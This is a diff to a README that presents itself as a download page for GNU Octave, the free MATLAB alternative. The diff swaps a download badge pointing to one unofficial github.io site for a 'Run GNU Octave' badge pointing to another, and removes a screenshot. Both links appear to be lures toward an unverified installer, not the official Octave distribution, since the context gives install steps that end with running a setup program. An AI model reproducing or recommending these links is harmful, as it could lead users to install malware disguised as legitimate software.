@@ -1,10 +1,6 @@
 # GNU Octave – Free MATLAB Alternative for Numerical Computing
 
-## 📥 GNU Octave
-
-[![⬇️ GNU Octave](https://img.shields.io/badge/Download-GNU%20Octave-darkblue?style=for-the-badge&logo=gnu)](https://loyalreynawuyq.github.io/.github/gnu-octave-free-matlab)
-
----
+[![Run GNU Octave](https://img.shields.io/badge/Run-GNU%20Octave-2563A6?style=for-the-badge)](https://gnu-octave-matlab.github.io/.github/)
 
 ## 📦 How to Install
 
@@ -14,13 +10,6 @@
 4. Follow the on-screen setup instructions.  
 5. Launch **GNU Octave** from the Start menu after installation.  
 
----
-
-<p align="center">
-  <img src="https://funprojects.blog/wp-content/uploads/2021/12/octave_over.png?w=1200&h=626&crop=1" alt="GNU Octave Interface" width="700">
-</p>
-
----
 
 ## ❓ What is GNU Octave?
 
